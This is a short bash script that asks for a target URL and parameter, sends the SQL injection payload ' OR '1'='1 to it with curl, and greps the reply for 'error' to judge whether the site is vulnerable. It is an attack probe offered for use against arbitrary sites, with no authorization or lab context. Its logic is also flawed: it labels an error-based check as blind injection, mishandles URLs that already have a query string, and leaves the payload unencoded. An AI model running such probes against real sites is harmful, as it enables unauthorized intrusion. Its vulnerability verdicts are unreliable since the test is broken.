#!/bin/bash
echo -e "Enter the target URL (e.g., http://example.com/page?id=1): "
read url
echo -e "Enter the parameter for injection (e.g., 'id'): "
read param

echo -e "\n[*] Testing Blind SQL Injection on $url with parameter $param..."

# You can customize the payload and other checks here
curl -s "$url?$param=1' OR '1'='1" | grep -i "error"
echo -e "[*] If an error is shown, the site is vulnerable to SQL Injection."
